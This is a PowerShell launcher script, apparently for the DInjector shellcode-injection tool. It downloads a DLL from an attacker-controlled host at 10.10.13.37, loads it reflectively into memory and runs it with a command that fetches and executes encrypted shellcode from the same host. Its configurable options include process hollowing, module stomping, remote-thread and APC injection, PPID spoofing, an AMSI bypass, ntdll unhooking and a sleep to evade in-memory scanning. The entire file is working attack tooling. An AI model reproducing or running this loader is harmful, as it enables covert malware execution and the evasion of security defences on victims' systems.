<#
.DESCRIPTION

Module name. Choose from:
  
  "functionpointer",
  "functionpointerunsafe",
  "clipboardpointer",
  "currentthread",
  "currentthreaduuid",
  "remotethread",
  "remotethreaddll",
  "remotethreadview",
  "remotethreadsuspended",
  "remotethreadkernelcb",
  "remotethreadapc",
  "remotethreadcontext",
  "processhollowing",
  "modulestomping"
#>
$A = "currentthread"

# lhost
$B = "10.10.13.37"

# lport
$C = 80

# injector filename
$D = "DInjector.dll"

# encrypted shellcode filename
$E = "enc"

# password to decrypt the shellcode
$F = "Passw0rd!"

# timeout for NtWaitForSingleObject in ms (0 is serve forever, used in "currentthread")
$G = 0

# path to the image of a newly spawned process to inject into (used in "remotethreadapc", "remotethreadcontext", "processhollowing" and "modulestomping")
$H = "C:\Windows\System32\svchost.exe"

# existing process name to inject into (used in "remotethread", "remotethreaddll", "remotethreadview", "remotethreadsuspended" and "remotethreadkernelcb")
$I = "notepad"

# parent process name to spoof the original value (use "0" to disable PPID spoofing) (used in "remotethreadapc", "remotethreadcontext", "processhollowing" and "modulestomping")
$J = "explorer"

# loaded module (DLL) name to overwrite its .text section for storing the shellcode (used in "remotethreaddll")
$K = "msvcp_win.dll"

# name of the module (DLL) to stomp (used in "modulestomping")
$L = "xpsservices.dll"

# exported function name to overwrite (used in "modulestomping")
$M = "DllCanUnloadNow"

# number of seconds (approx.) to sleep before execution to evade potential in-memory scan (for values greater than "60" it will take much longer to sleep)
$N = 0

# block 3rd-party DLLs ("True" / "False") (used in "remotethreadapc", "remotethreadcontext", "processhollowing" and "modulestomping")
$O = "True"

# bypass AMSI ("True" / "False")
$P = "True"

# unhook ntdll.dll ("True" / "False")
$Q = "False"

# --------------------------------------------------------------------

$methods = @("remotethread", "remotethreaddll", "remotethreadview", "remotethreadsuspended", "remotethreadkernelcb")
if ($methods.Contains($A)) {
    $I = (Start-Process -WindowStyle Hidden -PassThru $I).Id
}

$methods = @("remotethreadapc", "remotethreadcontext", "processhollowing", "modulestomping")
if ($methods.Contains($A)) {
    try {
        $J = (Get-Process $J -ErrorAction Stop).Id
        # if multiple processes exist with the same name, arbitrary select the first one
        if ($J -is [array]) {
            $J = $J[0]
        }
    }
    catch {
        $J = 0
    }
}

$cmd = "${A} /sc:http://${B}:${C}/${E} /password:${F} /timeout:${G} /image:${H} /pid:${I} /ppid:${J} /dll:${K} /stomp:${L} /export:${M} /sleep:${N} /blockDlls:${O} /am51:${P} /unhook:${Q}"

$data = (IWR -UseBasicParsing "http://${B}:${C}/${D}").Content
$assem = [System.Reflection.Assembly]::Load($data)

$flags = [Reflection.BindingFlags] "Public,NonPublic,Static"

$class = $assem.GetType("DInjector.Detonator", $flags)
$entry = $class.GetMethod("Boom", $flags)

$entry.Invoke($null, (, $cmd))
